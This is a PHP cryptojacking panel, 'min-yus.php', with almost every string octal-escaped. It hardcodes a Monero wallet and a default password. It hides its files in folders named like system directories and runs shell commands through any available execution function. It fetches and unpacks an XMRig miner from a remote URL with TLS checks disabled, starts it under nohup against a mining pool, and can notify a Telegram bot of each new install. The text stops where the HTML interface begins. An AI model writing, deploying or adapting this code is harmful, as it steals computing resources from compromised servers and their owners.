<?php
// =========================================================================
// min-yus.php - Universal Cross-Version Edition (PHP 5.4 to PHP 8.x+)
// =========================================================================
session_start();
@header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\164\145\170\164\057\150\164\155\154\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
@error_reporting(E_ALL);
@ini_set('\144\151\163\160\154\141\171\137\145\162\162\157\162\163', 0);

$cpu_limit = isset($_GET['\154\151\155\151\164']) ? intval($_GET['\154\151\155\151\164']) : 90;
$wallet = "\064\067\141\122\070\101\115\105\114\141\127\123\155\114\131\107\153\171\061\167\064\071\122\063\062\121\131\105\065\071\064\151\070\145\144\066\163\102\152\101\142\102\121\160\145\156\112\147\145\065\105\104\131\115\101\066\064\064\107\160\142\167\172\146\115\107\105\126\144\130\107\155\152\066\153\113\131\122\125\152\171\131\144\067\143\160\170\122\066\130\130\067\114\104\130";
$tg_bot_token = "";
$tg_chat_id = "";

$is_root = (function_exists('\160\157\163\151\170\137\147\145\164\165\151\144') && posix_getuid() === 0) || (function_exists('\147\145\164\155\171\165\151\144') && getmyuid() === 0);
$uid = function_exists('\160\157\163\151\170\137\147\145\164\165\151\144') ? @posix_getuid() : (function_exists('\147\145\164\155\171\165\151\144') ? @getmyuid() : 1000);

// =========================================================================
// EXECUTOR DETECTOR & SAFE COMMAND WRAPPER
// =========================================================================
function get_active_executor() {
    $disabled = @ini_get('\144\151\163\141\142\154\145\137\146\165\156\143\164\151\157\156\163');
    $disabled = $disabled ? array_map('\164\162\151\155', explode('\054', $disabled)) : array();
    $priority = array('\160\162\157\143\137\157\160\145\156', '\163\150\145\154\154\137\145\170\145\143', '\145\170\145\143', '\163\171\163\164\145\155', '\160\141\163\163\164\150\162\165', '\160\157\160\145\156');
    foreach ($priority as $func) {
        if (function_exists($func) && !in_array($func, $disabled)) {
            return $func;
        }
    }
    return null;
}

function run_system_command($cmd) {
    $executor = get_active_executor();
    if (!$executor) return false;

    switch ($executor) {
        case '\163\150\145\154\154\137\145\170\145\143':
            return @shell_exec($cmd);
        case '\145\170\145\143':
            $output = array();
            @exec($cmd, $output);
            return implode("\n", $output);
        case '\163\171\163\164\145\155':
            ob_start();
            @system($cmd);
            return ob_get_clean();
        case '\160\141\163\163\164\150\162\165':
            ob_start();
            @passthru($cmd);
            return ob_get_clean();
        case '\160\157\160\145\156':
            $handle = @popen($cmd, '\162');
            $read = '';
            if ($handle) {
                while (!feof($handle)) {
                    $read .= @fread($handle, 2048);
                }
                @pclose($handle);
            }
            return $read;
        case '\160\162\157\143\137\157\160\145\156':
            $descriptors = array(0 => array('\160\151\160\145', '\162'), 1 => array('\160\151\160\145', '\167'), 2 => array('\160\151\160\145', '\167'));
            $process = @proc_open($cmd, $descriptors, $pipes);
            $output = '';
            if (is_resource($process)) {
                $output = @stream_get_contents($pipes[1]);
                @fclose($pipes[0]);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($process);
            }
            return $output;
        default:
            return false;
    }
}

$detected_executor = get_active_executor();

// =========================================================================
// ROBUST DOWNLOAD HELPER
// =========================================================================
function download_file_robust($url, $destination) {
    $curl_cmd = "\143\165\162\154\040\055\153\146\163\123\114\040" . escapeshellarg($url) . "\040\055\157\040" . escapeshellarg($destination) . "\040\062\076\057\144\145\166\057\156\165\154\154";
    run_system_command($curl_cmd);
    if (file_exists($destination) && filesize($destination) > 1024) return true;

    $wget_cmd = "\167\147\145\164\040\055\055\156\157\055\143\150\145\143\153\055\143\145\162\164\151\146\151\143\141\164\145\040\055\161\040" . escapeshellarg($url) . "\040\055\117\040" . escapeshellarg($destination) . "\040\062\076\057\144\145\166\057\156\165\154\154";
    run_system_command($wget_cmd);
    if (file_exists($destination) && filesize($destination) > 1024) return true;

    if (@ini_get('\141\154\154\157\167\137\165\162\154\137\146\157\160\145\156')) {
        $context = stream_context_create(array("\163\163\154" => array("\166\145\162\151\146\171\137\160\145\145\162" => false, "\166\145\162\151\146\171\137\160\145\145\162\137\156\141\155\145" => false)));
        $content = @file_get_contents($url, false, $context);
        if ($content !== false && strlen($content) > 1024) {
            @file_put_contents($destination, $content, LOCK_EX);
            return true;
        }
    }
    return false;
}

// =========================================================================
// SETTINGS & DIRECTORY MANAGEMENT
// =========================================================================
$settings_file = __DIR__ . '\057\056\155\157\137\163\145\164\164\151\156\147\163\056\152\163\157\156';
if (!is_writable(__DIR__) && !file_exists($settings_file)) {
    $settings_file = sys_get_temp_dir() . '\057\056\155\157\137\163\145\164\164\151\156\147\163\137' . md5(__FILE__) . '\056\152\163\157\156';
}
$app_settings = file_exists($settings_file) ? json_decode(@file_get_contents($settings_file), true) : array();
if (!is_array($app_settings)) $app_settings = array();
$custom_dir = isset($app_settings['\143\165\163\164\157\155\137\144\151\162']) ? $app_settings['\143\165\163\164\157\155\137\144\151\162'] : '';

$miner_dir = "";
if (!empty($custom_dir)) {
    @mkdir($custom_dir, 0755, true);
    if (is_dir($custom_dir) && is_writable($custom_dir)) $miner_dir = rtrim($custom_dir, '\057');
}

if (empty($miner_dir)) {
    $home_dir = getenv('\110\117\115\105');
    $candidate_dirs = array(
        $home_dir ? $home_dir . '\057\056\143\141\143\150\145\057\056\146\157\156\164\143\157\156\146\151\147\057\056\144\141\164\141' : '',
        "\057\166\141\162\057\164\155\160\057\056\163\171\163\164\145\155\144\055\160\162\151\166\141\164\145\055\044\165\151\144",
        "\057\166\141\162\057\143\141\143\150\145\057\056\154\144\143\157\156\146\151\147",
        "\057\144\145\166\057\163\150\155\057\056\144\142\165\163\055\163\145\163\163\151\157\156",
        sys_get_temp_dir() . "\057\056\143\141\143\150\145\055\044\165\151\144"
    );
    foreach ($candidate_dirs as $dir) {
        if (empty($dir)) continue;
        @mkdir($dir, 0755, true);
        if (is_dir($dir) && is_writable($dir)) { $miner_dir = $dir; break; }
    }
    if (empty($miner_dir)) {
        $miner_dir = sys_get_temp_dir() . "\057\056\143\141\143\150\145\055\044\165\151\144";
        @mkdir($miner_dir, 0755, true);
    }
}

$work_dir = $miner_dir . '\057\056\154\151\142';
@mkdir($work_dir, 0755, true);
@chdir($work_dir);

$f_pid = $work_dir . '\057\056\160\151\144';
$config_file = $work_dir . '\057\143\157\156\146\151\147\056\152\163\157\156';
$xmrig_bin = $work_dir . '\057\170\155\162\151\147';
$log_file = $work_dir . '\057\170\155\162\151\147\056\154\157\147';
$passwd_file = $work_dir . '\057\056\160\141\163\163\167\144\056\152\163\157\156';
$app_salt = "\105\123\120\101\104\101\104\132";

if (!file_exists($passwd_file)) {
    $default_hash = hash('\163\150\141\062\065\066', "\105\123\120\101\104\101\104\132" . $app_salt);
    @file_put_contents($passwd_file, json_encode(array('\150\141\163\150' => $default_hash)), LOCK_EX);
}

$auth_data = json_decode(@file_get_contents($passwd_file), true);
$expected_password_hash = isset($auth_data['\150\141\163\150']) ? $auth_data['\150\141\163\150'] : hash('\163\150\141\062\065\066', "\105\123\120\101\104\101\104\132" . $app_salt);

$login_error = "";
if (isset($_POST['\154\157\147\151\156\137\160\141\163\163\167\157\162\144'])) {
    $input_hash = hash('\163\150\141\062\065\066', $_POST['\154\157\147\151\156\137\160\141\163\163\167\157\162\144'] . $app_salt);
    $is_match = function_exists('\150\141\163\150\137\145\161\165\141\154\163') ? hash_equals($expected_password_hash, $input_hash) : ($expected_password_hash === $input_hash);
    if ($is_match) {
        $_SESSION['\141\165\164\150\145\156\164\151\143\141\164\145\144'] = true;
        header("\114\157\143\141\164\151\157\156\072\040" . $_SERVER['\120\110\120\137\123\105\114\106']);
        exit;
    } else {
        $login_error = "\111\156\166\141\154\151\144\040\160\141\163\163\167\157\162\144\056";
    }
}

if (isset($_GET['\141\143\164\151\157\156']) && $_GET['\141\143\164\151\157\156'] === '\154\157\147\157\165\164') {
    unset($_SESSION['\141\165\164\150\145\156\164\151\143\141\164\145\144']);
    @session_destroy();
    header("\114\157\143\141\164\151\157\156\072\040" . $_SERVER['\120\110\120\137\123\105\114\106']);
    exit;
}

$is_authenticated = isset($_SESSION['\141\165\164\150\145\156\164\151\143\141\164\145\144']) && $_SESSION['\141\165\164\150\145\156\164\151\143\141\164\145\144'] === true;

$protocol = (!empty($_SERVER['\110\124\124\120\123']) && $_SERVER['\110\124\124\120\123'] !== '\157\146\146' || (isset($_SERVER['\123\105\122\126\105\122\137\120\117\122\124']) && $_SERVER['\123\105\122\126\105\122\137\120\117\122\124'] == 443)) ? "\150\164\164\160\163\072\057\057" : "\150\164\164\160\072\057\057";
$site_url = $protocol . (isset($_SERVER['\110\124\124\120\137\110\117\123\124']) ? $_SERVER['\110\124\124\120\137\110\117\123\124'] : '\154\157\143\141\154\150\157\163\164');
$parsed_host = parse_url($site_url, PHP_URL_HOST);
$pass_host = preg_replace('/[^a-zA-Z0-9\-]/'\054\040'-'\054\040\044\160\141\162\163\145\144\137\150\157\163\164\040\077\040\044\160\141\162\163\145\144\137\150\157\163\164\040\072\040'na');
if (empty($pass_host)) $pass_host = "\156\141";

function tg_send($msg, $token, $chat_id) {
    if (empty($token) || empty($chat_id)) return;
    $url = "\150\164\164\160\163\072\057\057\141\160\151\056\164\145\154\145\147\162\141\155\056\157\162\147\057\142\157\164\173\044\164\157\153\145\156\175\057\163\145\156\144\115\145\163\163\141\147\145";
    $payload = json_encode(array("\143\150\141\164\137\151\144" => $chat_id, "\164\145\170\164" => $msg, "\160\141\162\163\145\137\155\157\144\145" => "\110\124\115\114"));
    $options = array('\150\164\164\160' => array('\150\145\141\144\145\162' => "Content-Type: application/json\r\n", '\155\145\164\150\157\144' => '\120\117\123\124', '\143\157\156\164\145\156\164' => $payload, '\164\151\155\145\157\165\164' => 5));
    @file_get_contents($url, false, stream_context_create($options));
}

$cpu_cores = intval(run_system_command('\156\160\162\157\143\040\062\076\057\144\145\166\057\156\165\154\154'));
if ($cpu_cores <= 0) $cpu_cores = 4;

$ram_mb = 4096; $ram_free = 4096;
if (file_exists('\057\160\162\157\143\057\155\145\155\151\156\146\157')) {
    $meminfo = @file_get_contents('\057\160\162\157\143\057\155\145\155\151\156\146\157');
    if (preg_match('/MemTotal:\s+(\d+)\s+kB/', $meminfo, $m)) $ram_mb = intval($m[1] / 1024);
    if (preg_match('/MemAvailable:\s+(\d+)\s+kB/', $meminfo, $m)) $ram_free = intval($m[1] / 1024);
}
$arch = php_uname('\155');

function check_miner_running($pfile, $bin_path) {
    if (file_exists($pfile)) {
        $pid = intval(file_get_contents($pfile));
        if ($pid > 0) {
            if (function_exists('\160\157\163\151\170\137\153\151\154\154') && @posix_kill($pid, 0)) {
                return $pid;
            }
            if (file_exists("\057\160\162\157\143\057\173\044\160\151\144\175")) {
                return $pid;
            }
        }
    }
    $ps_out = trim(run_system_command("ps aux | grep '\133\170\135\155\162\151\147' | grep -v grep 2>/dev/null"));
    if (!empty($ps_out)) {
        $lines = explode("\n", $ps_out);
        $parts = preg_split('/\s+/', trim($lines[0]));
        if (isset($parts[1]) && is_numeric($parts[1])) return intval($parts[1]);
    }
    if (file_exists($pfile)) @unlink($pfile);
    return false;
}

$action = isset($_GET['\141\143\164\151\157\156']) ? $_GET['\141\143\164\151\157\156'] : '';

$restricted_actions = array('\163\164\141\164\165\163', '\163\164\157\160', '\162\145\163\164\141\162\164', '\151\156\163\164\141\154\154', '\165\156\151\156\163\164\141\154\154', '\165\160\144\141\164\145\137\167\141\154\154\145\164', '\143\150\141\156\147\145\137\160\141\163\163\167\157\162\144', '\147\145\164\137\154\157\147\163', '\147\145\164\137\143\157\156\146\151\147', '\163\141\166\145\137\143\157\156\146\151\147', '\165\160\144\141\164\145\137\143\165\163\164\157\155\137\144\151\162');
if (!empty($action) && in_array($action, $restricted_actions)) {
    if (!$is_authenticated) {
        @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
        echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\125\156\141\165\164\150\157\162\151\172\145\144\040\141\143\143\145\163\163\056"));
        exit;
    }
}

$active_wallet = $wallet;
$active_pass = $pass_host;
if (file_exists($config_file)) {
    $cfg = json_decode(@file_get_contents($config_file), true);
    if (isset($cfg['\160\157\157\154\163'][0]['\165\163\145\162']) && !empty($cfg['\160\157\157\154\163'][0]['\165\163\145\162']) && $cfg['\160\157\157\154\163'][0]['\165\163\145\162'] !== '\131\117\125\122\137\127\101\114\114\105\124\137\101\104\104\122\105\123\123') {
        $active_wallet = $cfg['\160\157\157\154\163'][0]['\165\163\145\162'];
    }
    if (isset($cfg['\160\157\157\154\163'][0]['\160\141\163\163']) && !empty($cfg['\160\157\157\154\163'][0]['\160\141\163\163']) && $cfg['\160\157\157\154\163'][0]['\160\141\163\163'] !== '\170') {
        $active_pass = $cfg['\160\157\157\154\163'][0]['\160\141\163\163'];
    }
}

if ($action === '\163\164\141\164\165\163') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $uptime = 0;
    $running_pid = check_miner_running($f_pid, $xmrig_bin);
    $isRunning = ($running_pid !== false);
    $process_info = $isRunning ? "\101\143\164\151\166\145\040\120\111\104\072\040\173\044\162\165\156\156\151\156\147\137\160\151\144\175" : "\116\157\164\040\122\165\156\156\151\156\147";

    if ($isRunning) {
        $etimes = trim(run_system_command("\160\163\040\055\157\040\145\164\151\155\145\163\075\040\055\160\040\173\044\162\165\156\156\151\156\147\137\160\151\144\175\040\062\076\057\144\145\166\057\156\165\154\154"));
        if (is_numeric($etimes)) $uptime = intval($etimes);
    } else {
        if (file_exists($f_pid)) @unlink($f_pid);
    }

    echo json_encode(array(
        "\163\164\141\164\165\163" => $isRunning ? "\122\125\116\116\111\116\107" : "\123\124\117\120\120\105\104",
        "\162\165\156\156\151\156\147\137\141\144\144\162\145\163\163" => $active_wallet,
        "\162\165\156\156\151\156\147\137\160\141\163\163" => $active_pass,
        "\163\151\164\145\137\165\162\154" => $site_url,
        "\160\141\163\163\137\164\141\147" => $pass_host,
        "\143\157\162\145\163" => $cpu_cores,
        "\162\141\155" => $ram_mb,
        "\165\160\164\151\155\145" => $uptime,
        "\145\170\145\143\165\164\157\162" => $detected_executor ? $detected_executor : "\116\157\156\145",
        "\160\162\157\143\145\163\163\137\151\156\146\157" => $process_info,
        "\142\151\156\141\162\171\137\145\170\151\163\164\163" => file_exists($xmrig_bin),
        "\142\151\156\141\162\171\137\145\170\145\143\165\164\141\142\154\145" => file_exists($xmrig_bin) && is_executable($xmrig_bin),
        "\144\151\162\137\167\162\151\164\141\142\154\145" => is_writable($work_dir),
        "\151\163\137\162\157\157\164" => $is_root,
        "\167\157\162\153\137\144\151\162" => $work_dir,
        "\143\165\163\164\157\155\137\144\151\162" => $custom_dir
    ));
    exit;
}

if ($action === '\165\160\144\141\164\145\137\143\165\163\164\157\155\137\144\151\162' && isset($_POST['\143\165\163\164\157\155\137\144\151\162'])) {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $new_dir = trim($_POST['\143\165\163\164\157\155\137\144\151\162']);
    if (!empty($new_dir)) {
        @mkdir($new_dir, 0755, true);
        if (!is_dir($new_dir) || !is_writable($new_dir)) {
            echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\104\151\162\145\143\164\157\162\171\040\144\157\145\163\040\156\157\164\040\145\170\151\163\164\040\157\162\040\151\163\040\156\157\164\040\167\162\151\164\141\142\154\145\056"));
            exit;
        }
    }
    $app_settings['\143\165\163\164\157\155\137\144\151\162'] = $new_dir;
    @file_put_contents($settings_file, json_encode($app_settings), LOCK_EX);
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\103\165\163\164\157\155\040\144\151\162\145\143\164\157\162\171\040\163\141\166\145\144\040\163\165\143\143\145\163\163\146\165\154\154\171\041"));
    exit;
}

if ($action === '\147\145\164\137\154\157\147\163') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $logs = "\114\157\147\040\146\151\154\145\040\151\163\040\145\155\160\164\171\040\157\162\040\144\157\145\163\040\156\157\164\040\145\170\151\163\164\040\171\145\164\056";
    if (file_exists($log_file)) {
        $tail_out = trim(run_system_command("\164\141\151\154\040\055\156\040\071\060\040" . escapeshellarg($log_file) . "\040\062\076\057\144\145\166\057\156\165\154\154"));
        $logs = !empty($tail_out) ? $tail_out : @file_get_contents($log_file);
    }
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\154\157\147\163" => $logs));
    exit;
}

if ($action === '\147\145\164\137\143\157\156\146\151\147') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\143\157\156\146\151\147" => file_exists($config_file) ? file_get_contents($config_file) : "\173\175"));
    exit;
}

if ($action === '\163\141\166\145\137\143\157\156\146\151\147' && isset($_POST['\143\157\156\146\151\147\137\152\163\157\156'])) {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $decoded = json_decode($_POST['\143\157\156\146\151\147\137\152\163\157\156'], true);
    if ($decoded === null) {
        echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\111\156\166\141\154\151\144\040\112\123\117\116\040\146\157\162\155\141\164\056"));
        exit;
    }
    if (isset($decoded['\160\157\157\154\163'][0]['\165\162\154']) && preg_match('/:(\d+)$/'\054\040\044\144\145\143\157\144\145\144\133'pools'\135\133\060\135\133'url'], $m)) {
        $decoded['\160\157\157\154\163'][0]['\164\154\163'] = (intval($m[1]) >= 20000);
    }
    $decoded['\154\157\147\055\146\151\154\145'] = "\170\155\162\151\147\056\154\157\147";
    
    $json_flags = defined('\112\123\117\116\137\120\122\105\124\124\131\137\120\122\111\116\124') ? (JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) : 0;
    @file_put_contents($config_file, json_encode($decoded, $json_flags), LOCK_EX);
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\103\157\156\146\151\147\165\162\141\164\151\157\156\040\163\141\166\145\144\040\163\165\143\143\145\163\163\146\165\154\154\171\056"));
    exit;
}

if ($action === '\163\164\157\160') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    if (file_exists($f_pid)) {
        $p = intval(file_get_contents($f_pid));
        if ($p > 0) run_system_command("\153\151\154\154\040\055\071\040\044\160\040\062\076\057\144\145\166\057\156\165\154\154");
        @unlink($f_pid);
    }
    run_system_command("\160\153\151\154\154\040\055\071\040\055\146\040\170\155\162\151\147\040\062\076\057\144\145\166\057\156\165\154\154");
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\120\162\157\143\145\163\163\040\163\165\143\143\145\163\163\146\165\154\154\171\040\164\145\162\155\151\156\141\164\145\144\056"));
    exit;
}

if ($action === '\165\156\151\156\163\164\141\154\154') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    if (file_exists($f_pid)) {
        $p = intval(@file_get_contents($f_pid));
        if ($p > 0) run_system_command("\153\151\154\154\040\055\071\040\044\160\040\062\076\057\144\145\166\057\156\165\154\154");
        @unlink($f_pid);
    }
    run_system_command("\160\153\151\154\154\040\055\071\040\055\146\040\170\155\162\151\147\040\062\076\057\144\145\166\057\156\165\154\154");
    if (is_dir($work_dir)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($work_dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? '\162\155\144\151\162' : '\165\156\154\151\156\153');
            @$todo($fileinfo->getRealPath());
        }
        @rmdir($work_dir);
    }
    echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\116\157\144\145\040\143\157\155\160\154\145\164\145\154\171\040\165\156\151\156\163\164\141\154\154\145\144\056"));
    exit;
}

if ($action === '\162\145\163\164\141\162\164' || $action === '\151\156\163\164\141\154\154') {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    run_system_command("\160\153\151\154\154\040\055\071\040\055\146\040\170\155\162\151\147\040\062\076\057\144\145\166\057\156\165\154\154");
    if (file_exists($f_pid)) @unlink($f_pid);

    $mo_url = "\150\164\164\160\163\072\057\057\162\141\167\056\147\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\115\157\156\145\162\157\117\143\145\141\156\057\170\155\162\151\147\137\163\145\164\165\160\057\155\141\163\164\145\162\057\170\155\162\151\147\056\164\141\162\056\147\172";
    $tmp_file = $work_dir . '\057\056\164\155\160';

    if (!file_exists($xmrig_bin)) {
        if (download_file_robust($mo_url, $tmp_file)) {
            run_system_command("\164\141\162\040\055\170\146\040" . escapeshellarg($tmp_file) . "\040\055\103\040" . escapeshellarg($work_dir) . "\040\062\076\057\144\145\166\057\156\165\154\154");
            @unlink($tmp_file);
        }
    }

    $threads = $cpu_cores;
    $mtr = intval($ram_mb / 2048); if ($mtr < 1) $mtr = 1; if ($mtr < $threads) $threads = $mtr;
    $ehr = intval($threads * 700 / 1000); if ($ehr < 1) $ehr = 1;
    $mp = $ehr * 30; if ($mp < 1) $mp = 1;
    
    $powers_of_2 = array(1,2,4,8,16,32,64,128,256,512,1024,2048,4096,8192);
    foreach ($powers_of_2 as $_p2) {
        if ($_p2 >= $mp) { $mp = $_p2; break; }
    }
    $mo_port = 10000 + $mp;
    $rx_mode = ($ram_free < 2400 || $ram_mb < 3072) ? "\154\151\147\150\164" : "\146\141\163\164";
    $active_pool_url = "\160\157\157\154\056\150\141\163\150\166\141\165\154\164\056\160\162\157\072" . $mo_port;

    if (file_exists($config_file)) {
        $existing_cfg = json_decode(@file_get_contents($config_file), true);
        if (is_array($existing_cfg)) {
            if (isset($existing_cfg['\160\157\157\154\163'][0]['\165\163\145\162']) && !empty($existing_cfg['\160\157\157\154\163'][0]['\165\163\145\162']) && $existing_cfg['\160\157\157\154\163'][0]['\165\163\145\162'] !== '\131\117\125\122\137\127\101\114\114\105\124\137\101\104\104\122\105\123\123') {
                $active_wallet = $existing_cfg['\160\157\157\154\163'][0]['\165\163\145\162'];
            }
            if (isset($existing_cfg['\160\157\157\154\163'][0]['\160\141\163\163']) && !empty($existing_cfg['\160\157\157\154\163'][0]['\160\141\163\163']) && $existing_cfg['\160\157\157\154\163'][0]['\160\141\163\163'] !== '\170') {
                $active_pass = $existing_cfg['\160\157\157\154\163'][0]['\160\141\163\163'];
            }
            if (isset($existing_cfg['\160\157\157\154\163'][0]['\165\162\154']) && !empty($existing_cfg['\160\157\157\154\163'][0]['\165\162\154'])) {
                $active_pool_url = $existing_cfg['\160\157\157\154\163'][0]['\165\162\154'];
            }
        }
    }

    $detected_port = 443;
    if (preg_match('/:(\d+)$/', $active_pool_url, $matches)) {
        $detected_port = intval($matches[1]);
    }
    $active_tls = ($detected_port >= 20000);

    $config_data = array(
        "\141\165\164\157\163\141\166\145" => false, "\142\141\143\153\147\162\157\165\156\144" => false, "\143\157\154\157\162\163" => false,
        "\162\141\156\144\157\155\170" => array("\155\157\144\145" => $rx_mode),
        "\143\160\165" => array("\150\165\147\145\055\160\141\147\145\163" => true, "\155\141\170\055\164\150\162\145\141\144\163\055\150\151\156\164" => $cpu_limit, "\155\145\155\157\162\171\055\160\157\157\154" => ($rx_mode === "\146\141\163\164")),
        "\144\157\156\141\164\145\055\154\145\166\145\154" => 1, "\154\157\147\055\146\151\154\145" => "\170\155\162\151\147\056\154\157\147",
        "\160\157\157\154\163" => array(array(
            "\165\162\154" => $active_pool_url, 
            "\165\163\145\162" => $active_wallet, 
            "\160\141\163\163" => $active_pass, 
            "\153\145\145\160\141\154\151\166\145" => true, 
            "\164\154\163" => $active_tls
        )),
        "\160\162\151\156\164\055\164\151\155\145" => 60, "\162\145\164\162\151\145\163" => 5, "\162\145\164\162\171\055\160\141\165\163\145" => 5
    );
    
    $json_flags = defined('\112\123\117\116\137\120\122\105\124\124\131\137\120\122\111\116\124') ? (JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) : 0;
    @file_put_contents($config_file, json_encode($config_data, $json_flags), LOCK_EX);

    if (file_exists($xmrig_bin)) {
        @chmod($xmrig_bin, 0755);
        $cmd = sprintf("\156\157\150\165\160\040\045\163\040\055\143\040\045\163\040\076\040\170\155\162\151\147\056\154\157\147\040\062\076\046\061\040\046\040\145\143\150\157\040\044\041", escapeshellarg($xmrig_bin), escapeshellarg($config_file));
        $pid = trim(run_system_command($cmd));
        if (!empty($pid)) {
            @file_put_contents($f_pid, $pid, LOCK_EX);
            tg_send("<b>[MoneroOcean INSTALLED]</b>\n<b>URL:</b> {$site_url}", $tg_bot_token, $tg_chat_id);
            echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\105\156\147\151\156\145\040\163\164\141\162\164\145\144\040\163\165\143\143\145\163\163\146\165\154\154\171\056"));
            exit;
        }
    }
    echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\106\141\151\154\145\144\040\164\157\040\163\164\141\162\164\040\142\151\156\141\162\171\040\145\156\147\151\156\145\056"));
    exit;
}

if ($action === '\165\160\144\141\164\145\137\167\141\154\154\145\164' && isset($_POST['\167\141\154\154\145\164'])) {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $new_wallet = trim($_POST['\167\141\154\154\145\164']);
    $new_pass = isset($_POST['\160\141\163\163']) ? trim($_POST['\160\141\163\163']) : $pass_host;
    if (!empty($new_wallet) && file_exists($config_file)) {
        $cfg = json_decode(@file_get_contents($config_file), true);
        if (isset($cfg['\160\157\157\154\163'][0])) {
            $cfg['\160\157\157\154\163'][0]['\165\163\145\162'] = $new_wallet;
            $cfg['\160\157\157\154\163'][0]['\160\141\163\163'] = $new_pass;
            $json_flags = defined('\112\123\117\116\137\120\122\105\124\124\131\137\120\122\111\116\124') ? (JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) : 0;
            @file_put_contents($config_file, json_encode($cfg, $json_flags), LOCK_EX);
            echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\127\141\154\154\145\164\040\165\160\144\141\164\145\144\040\163\165\143\143\145\163\163\146\165\154\154\171\056"));
            exit;
        }
    }
    echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\106\141\151\154\145\144\040\164\157\040\165\160\144\141\164\145\040\143\157\156\146\151\147\165\162\141\164\151\157\156\056"));
    exit;
}

if ($action === '\143\150\141\156\147\145\137\160\141\163\163\167\157\162\144' && isset($_POST['\143\165\162\162\145\156\164\137\160\141\163\163\167\157\162\144'], $_POST['\156\145\167\137\160\141\163\163\167\157\162\144'])) {
    @header('\103\157\156\164\145\156\164\055\124\171\160\145\072\040\141\160\160\154\151\143\141\164\151\157\156\057\152\163\157\156\073\040\143\150\141\162\163\145\164\075\165\164\146\055\070');
    $current_input_hash = hash('\163\150\141\062\065\066', $_POST['\143\165\162\162\145\156\164\137\160\141\163\163\167\157\162\144'] . $app_salt);
    $is_match = function_exists('\150\141\163\150\137\145\161\165\141\154\163') ? hash_equals($expected_password_hash, $current_input_hash) : ($expected_password_hash === $current_input_hash);
    if ($is_match) {
        $new_pass = trim($_POST['\156\145\167\137\160\141\163\163\167\157\162\144']);
        if (strlen($new_pass) >= 4) {
            $new_hash = hash('\163\150\141\062\065\066', $new_pass . $app_salt);
            @file_put_contents($passwd_file, json_encode(array('\150\141\163\150' => $new_hash)), LOCK_EX);
            echo json_encode(array("\163\165\143\143\145\163\163" => true, "\155\145\163\163\141\147\145" => "\120\141\163\163\167\157\162\144\040\143\150\141\156\147\145\144\040\163\165\143\143\145\163\163\146\165\154\154\171\056"));
        } else {
            echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\120\141\163\163\167\157\162\144\040\155\165\163\164\040\142\145\040\141\164\040\154\145\141\163\164\040\064\040\143\150\141\162\141\143\164\145\162\163\056"));
        }
    } else {
        echo json_encode(array("\163\165\143\143\145\163\163" => false, "\155\145\163\163\141\147\145" => "\103\165\162\162\145\156\164\040\160\141\163\163\167\157\162\144\040\151\163\040\151\156\143\157\162\162\145\143\164\056"));
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="\145\156" data-theme="\144\141\162\153">
<head>
    <meta charset="\125\124\106\055\070">
